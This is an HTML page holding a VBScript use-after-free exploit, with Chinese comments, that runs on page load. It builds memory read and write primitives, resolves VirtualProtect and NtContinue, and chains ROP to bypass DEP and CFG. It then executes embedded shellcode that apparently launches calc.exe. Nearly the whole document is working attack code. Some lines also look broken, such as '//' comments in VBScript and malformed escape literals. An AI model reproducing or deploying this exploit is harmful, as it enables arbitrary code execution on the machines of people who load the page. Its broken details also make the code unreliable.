<!doctype html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="x-ua-compatible" content="IE=10">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-control" content="no-cache">
<meta http-equiv="Cache" content="no-cache">
</head>
<body>
<script language="vbscript">
Dim gNumber
Dim arrayA(6),arrayB(6)
Dim index
Dim gArray(40)
Dim hexA, hexB
Dim address
Dim memClassA,memClassB
Dim swapA,swapB
Dim NtContinueAddr,VirtualProtectAddr
 
// 构造用于读写的假对象
hexA = Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
hexB = Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
address = 0
index = 0
 
// 用于读写 32 位地址数据
Function GetUint32(Addr)
    Dim value
    memClassA.mem(address + 8) = Addr + 4
    memClassA.mem(address) = 8      // 修改为类型字符串 
 
    value = memClassA.P0123456789
    memClassA.mem(address) = 2
    GetUint32 = value
End Function
 
// 读取 word
Function readWord(addr)
    readWord = GetUint32(addr) And 65535
End Function
 
// 读取字节
Function readByte(addr)
    readByte = GetUint32(addr) And (&hFF)
End Function
 
// 获取模块基址
Function GetBaseByDOSmodeSearch(in_addr)
    Dim addr
    addr = in_addr And &hFFFF0000
    Do While GetUint32(addr+&h68)<>&h206E6920 Or GetUint32(addr+&h6C)<>&h20534F44
        addr = addr-&h10000
    Loop
    GetBaseByDOSmodeSearch = addr
End Function

// 字符串比较
Function StrCompWrapper(addr, szName)
    Dim str,i
    str = ""
    For i = 0 To Len(szName) - 1
        str = str & Chr(readByte(addr+i))
    Next
    StrCompWrapper = StrComp(UCase(str), UCase(szName))
End Function
 
// 通过基地址找到指定模块地址
Function GetBaseFromImport(base_address, name_input)
    Dim import_rva, nt_header, descriptor, import_dir
    Dim addr

    // 从 PE 读取 nt_header
    nt_header = GetUint32(base_address + (&h3c))

    // 读取导入表偏移
    import_rva = GetUint32(base_address + nt_header + &h80)

    // 计算出导入表地址
    import_dir = base_address + import_rva
    descriptor = 0
 
    Do While True
        Dim NameOffset
        NameOffset = GetUint32(import_dir + descriptor * (&h14) + &hC)
        If NameOffset = 0 Then
            GetBaseFromImport = &hBAAD0000
            Exit Function
        Else
            If StrCompWrapper(base_address + NameOffset, name_input) = 0 Then
                Exit Do
            End If
        End If
        descriptor = descriptor+1
    Loop

    // 随便取一个导入函数的地址
    addr = GetUint32(import_dir + descriptor * (&h14) + &h10)
    addr = GetUint32(base_address + addr)
 
    // 获取模块基址
    GetBaseFromImport = GetBaseByDOSmodeSearch(addr)
End Function

// 通过模块基址获取函数地址
Function GetProcAddr(dll_base, name)
    Dim p, export_dir, index
    Dim function_rvas, function_names, function_ordin
    Dim Ordin

    p = GetUint32(dll_base + &h3c)
    p = GetUint32(dll_base + p + &h78)
    export_dir = dll_base + p
    function_rvas = dll_base + GetUint32(export_dir + &h1c)
    function_names = dll_base + GetUint32(export_dir + &h20)
    function_ordin = dll_base + GetUint32(export_dir + &h24)
    index = 0

    Do While True
        Dim offset
        offset = GetUint32(function_names + index * 4)
        If StrCompWrapper(dll_base + offset, name) = 0 Then
            Exit Do
        End If
        index = index + 1
    Loop

    Ordin = readWord(function_ordin + index * 2)
    p = GetUint32(function_rvas + Ordin * 4)
    GetProcAddr = dll_base + p
End Function

// 获取 shellcode
Function GetShellcode()
    hexCode = Unescape("%u0000%u0000%u0000%u0000") & Unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100%u0065%u0000%u0000%u0000%u0000%u0000%ucc00%ucccc%ucccc%ucccc%ucccc")
    GetShellcode = hexCode
End Function

// 构建虚地址表用于执行 shellcode
Function BuildVirtualTable
    Dim i, szNtContinueAddr, str, szAddr0, szAddr8, szAddr16, szAddr24
     
    szNtContinueAddr = NumberToString(NtContinueAddr, 8)
    szAddr0 = Mid(szNtContinueAddr,1,2)
    szAddr8 = Mid(szNtContinueAddr,3,2)
    szAddr16 = Mid(szNtContinueAddr,5,2)
    szAddr24 = Mid(szNtContinueAddr,7,2)
 
    str = ""
    str = str & "%u0000%u" &szAddr24 &"00"
    For i = 1 To 3
        str = str & "%u" &szAddr8 &szAddr16
        str = str & "%u" &szAddr24 &szAddr0
    Next
    str = str & "%u" & szAddr8 & szAddr16
    str = str & "%u00" & szAddr0
 
    BuildVirtualTable = Unescape(str)
End Function

// NumberToString
Function NumberToString(ByVal Number, ByVal Length)
    hNumber = Hex(Number)
    If Len(hNumber) < Length Then
        hNumber = String(Length - Len(hNumber), "0") & hNumber
    Else
        hNumber = Right(hNumber, Length)
    End If
    NumberToString = hNumber
End Function

// 
Function EscapeAddress(ByVal value)
    Dim High, Low
    High = NumberToString((value And &hFFFF0000) / &h10000, 4)
    Low = NumberToString(value And &hFFFF, 4)
    EscapeAddress = Unescape("%u"&Low&"%u"&High)
End Function

// 用 NtContinue 上下文包装 Shellcode
Function WrapShellcodeWithNtContinueContext(ShellcodeAddrParam)
    Dim ropChain

    // ROP 小工具, 绕过 CFG
    ropChain = String(34798, Unescape("%u4141"))
    ropChain = ropChain & EscapeAddress(ShellcodeAddrParam)
    ropChain = ropChain & EscapeAddress(ShellcodeAddrParam)
    ropChain = ropChain & EscapeAddress(&h3000)
    ropChain = ropChain & EscapeAddress(&h40)
    ropChain = ropChain & EscapeAddress(ShellcodeAddrParam-8)
    ropChain = ropChain & String(6, Unescape("%u4242"))
    ropChain = ropChain & BuildVirtualTable()
    ropChain = ropChain & String((&h80000 - LenB(ropChain)) / 2, Unescape("%u4141"))
    WrapShellcodeWithNtContinueContext = ropChain
End Function

// 通过 VirtualProtect 进行扩展绕过 DEP
Function ExpandWithVirtualProtect(ropAddr)
    Dim szContext
    Dim Addr
    Addr = ropAddr + &h23
    szContext = ""
    szContext = szContext & EscapeAddress(Addr)
    szContext = szContext & String((&hb8 - LenB(szContext)) / 2, Unescape("%4141"))
    szContext = szContext & EscapeAddress(VirtualProtectAddr)
    szContext = szContext & EscapeAddress(&h1b)
    szContext = szContext & EscapeAddress(0)
    szContext = szContext & EscapeAddress(ropAddr)
    szContext = szContext & EscapeAddress(&h23)
    szContext = szContext & String((&400-LenB(szContext))/2,Unescape("%u4343"))
    ExpandWithVirtualProtect = szContext
End Function

// 执行 shellcode
Sub ExecuteShellcode
    // 把类型改成0x4D
    memClassA.mem(address) = &h4d
    Msgbox "ExecuteShellcode"
    memClassA.mem(address + 8) = 0
End Sub

// 设置 UAF 1
Class claA
    Private Sub Class_Terminate()
        Msgbox "Set arrayA"
        Set arrayA(index) = gNumber(1)
        index = index + 1
        gNumber(1) = 1
    End Sub
End Class

// 设置 UAF 2
Class claB
    Private Sub Class_Terminate()
        Set arrayB(index) = gNumber(1)
        index = index + 1
        gNumber(1) = 1
    End Sub
End Class
 
Class testClass
End Class

// 
Class memClass
    Dim mem

    Function P
    End Function
     
    Function SetProp(Value)
        Msgbox "SetProp"
        mem = Value
        Msgbox "SetProp = 0"
        SetProp = 0
    End Function
End Class

// 读取原语构造
Class readMemClass
    Dim mem
    Function P0123456789
        P0123456789 = LenB(mem(address+8))
    End Function

    Function SPP
    End Function
End Class
     
Class swapObjectA
    Public Default Property Get P
        Dim object
        P = 174088534690791e-324
        
        For i = 0 To 6
            arrayA(i) = 0
        Next
        
        Set object = New readMemClass
        Msgbox "object.mem = hexA"
        object.mem = hexA
        
        For i = 0 To 6
            Set arrayA(i) = object
        Next
    End Property
End Class

Class swapObjectB
    Public Default Property Get P
        Dim object
        P=636598737289582e-328
         
        For i = 0 To 6
            arrayB(i) = 0
        Next
         
        Set object = New readMemClass
        object.mem = hexB
         
        For i = 0 To 6
            Set arrayB(i) = object
        Next
    End Property
End Class
 
Set swapA = New swapObjectA
Set swapB = New swapObjectB

// 设置 UAF
Sub UAF
    // 使用 testClass 和 memClass 占位, 使得之后的占位更稳定
    For i = 0 To &h11
        Set gArray(i) = New testClass
    Next
 
    For i = &h14 To &h26
        Set gArray(i) = New memClass
    Next

    // 释放 claA 对象, 指针保存到 arrayA
    index = 0
    For i = 0 To 6
        ReDim gNumber(1)
        Set gNumber(1) = New claA
        Erase gNumber
    Next

    // memClass 占位
    Set memClassA = New memClass

    arrayB(0) = 0

    // 释放 claB 对象, 指针保存到 arrayB
    index = 0
    For i = 0 To 6
        ReDim gNumber(1)
        Set gNumber(1) = New claB
        Erase gNumber
    Next

    // memClass 占位
    Set memClassB = New memClass
End Sub

Sub InitObjects
    Msgbox "InitObjects"

    // memClassA 现在的类型是 readMemClass 
    memClassA.SetProp(swapA)

    // memClassB 现在的类型是 readMemClass 
    memClassB.SetProp(swapB)

    address = memClassB.mem
End Sub
 
Sub testSub
End Sub

// 读取字节
Function GetMemValue
    memClassA.mem(address) = 3
    GetMemValue = memClassA.mem(address + 8)
End Function

// 写入字节
Sub SetMemValue(ByRef in_Ref)
    memClassA.mem(address + 8) = in_Ref
End Sub

// 泄露 VB 地址
Function LeakVBAddr
    On Error Resume Next

    Dim pCScriptEntryPointObject
    pCScriptEntryPointObject = testSub
    pCScriptEntryPointObject = null

    SetMemValue pCScriptEntryPointObject
    LeakVBAddr = GetMemValue()
End Function

// 开始利用
Sub StartExploit
    UAF
    InitObjects

    // 获取 VTable 地址
    pCScriptEntryPointObject = LeakVBAddr()
    pVTable = GetUint32(pCScriptEntryPointObject)
    // Msgbox "CScriptEntryPointObject Leak: 0x" & Hex(pCScriptEntryPointObject)
    // Msgbox "pVTable Leak: 0x" & Hex(pVTable)

    // 通过 VTable 地址获取 vbs 模块地址
    vbs_base = GetBaseByDOSmodeSearch(pVTable)

    // 获取模块地址
    msv_base = GetBaseFromImport(vbs_base, "msvcrt.dll")
    krb_base = GetBaseFromImport(msv_base, "kernelbase.dll")
    ntd_base = GetBaseFromImport(msv_base, "ntdll.dll")

    // 获取函数地址
    VirtualProtectAddr = GetProcAddr(krb_base, "VirtualProtect")
    NtContinueAddr = GetProcAddr(ntd_base, "NtContinue")
    // Msgbox "VirtualProtectAddr: 0x" & Hex(VirtualProtectAddr)
    // Msgbox "NtContinueAddr: 0x" & Hex(NtContinueAddr)
 
    // 写入 shellcode 并获取 shellcode
    SetMemValue GetShellcode()
    ShellcodeAddr = GetMemValue() + 8
 
    // 构建 ROP
    SetMemValue WrapShellcodeWithNtContinueContext(ShellcodeAddr)
    ropAddr = GetMemValue() + 69596
 
    // 构建 CONTEXT 运行 shellcode
    SetMemValue ExpandWithVirtualProtect(ropAddr)
    GetMemValue()
    ExecuteShellcode
End Sub

StartExploit
</script>
</body>
</html>